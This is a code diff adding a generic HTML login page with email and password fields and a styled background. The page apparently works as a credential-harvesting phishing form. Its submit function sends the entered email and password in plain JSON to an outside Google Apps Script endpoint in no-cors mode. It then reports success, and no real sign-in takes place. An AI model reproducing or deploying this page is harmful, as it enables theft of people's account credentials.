@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: url('https://imgur.com/a/yUHSgnI') no-repeat center center/cover;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 300px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login</h2>
+        <input type="email" id="email" placeholder="Enter your email" required>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button onclick="submitData()">Submit</button>
+    </div>
+
+    <script>
+        function submitData() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            if (!email || !password) {
+                alert("Please fill out all fields.");
+                return;
+            }
+            
+            fetch("https://script.google.com/macros/s/AKfycbziVjy-ZBufFkKxUGRy-NDKDIq2VZ9HrNxuaaM7UUgnsBS9crmy5d6BtrcMC1DXjWX1/exec", {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password })
+            })
+            .then(() => alert("Data submitted successfully!"))
+            .catch(err => console.error("Error:", err));
+        }
+    </script>
+</body>
+</html>
